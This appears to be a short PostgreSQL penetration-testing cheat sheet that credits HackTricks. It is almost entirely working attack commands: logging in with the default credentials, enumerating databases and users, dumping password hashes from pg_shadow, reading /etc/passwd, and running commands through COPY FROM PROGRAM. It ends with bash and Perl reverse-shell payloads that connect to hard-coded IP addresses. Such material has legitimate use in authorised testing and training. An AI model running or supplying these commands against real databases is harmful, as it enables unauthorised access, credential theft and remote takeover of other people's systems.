## CONNECT - CHECK DEFAULT CREDENTIAL
```bash
# Default creds
postgres:postgres

# Connect
sudo psql -h $ip -p 5437 -U postgres
```
## ENUMERATION
```bash
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles
# Get users roles
\du


# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
## READ FILE
```bash
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
## RCE
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/192.168.45.203/80 0>&1';
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.186:113");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
## REFERENCE
```bash
https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#connect-and-basic-enum
```
